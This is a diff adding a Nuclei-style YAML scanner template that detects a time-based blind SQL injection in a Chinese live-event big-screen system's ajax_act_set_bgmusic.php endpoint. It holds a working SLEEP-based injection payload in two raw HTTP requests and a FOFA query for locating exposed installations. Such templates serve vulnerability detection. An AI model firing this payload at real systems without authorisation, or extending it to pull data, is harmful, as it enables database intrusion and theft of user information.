@@ -1,0 +1,27 @@
+http:
+    - matchers:
+        - condition: and
+          dsl:
+            - duration_1>=4 && duration_1<=5
+            - duration_2>=8 && duration_2<=9
+          type: dsl
+      raw:
+        - |
+          GET /wall/ajax_act_set_bgmusic.php?bgmusicstatus=1&plugname=%22XOR(if(now()=sysdate(),SLEEP(4),0))XOR%22Z HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
+        - |
+          GET /wall/ajax_act_set_bgmusic.php?bgmusicstatus=1&plugname=%22XOR(if(now()=sysdate(),SLEEP(8),0))XOR%22Z HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
+id: jinhuadijia-ajax_act_set_bgmusic_php-sql-time
+info:
+    author: Superhero
+    description: |-
+        fofa: body="/wall/themes/meepo/assets/images/defaultbg.jpg" || title="现场活动大屏幕系统"
+        金华迪加 现场大屏互动系统 ajax_act_set_bgmusic.php接口处存在SQL注入漏洞，未授权的攻击者可通过此漏洞获取数据库权限，从而盗取用户数据，造成用户信息泄露。
+    name: 金华迪加 现场大屏互动系统 ajax_act_set_bgmusic.php SQL注入漏洞
+    reference:
+        - https://mp.weixin.qq.com/s/O5qiMXPvTmGsAtaWbwmmLQ
+    severity: high
+    tags: []
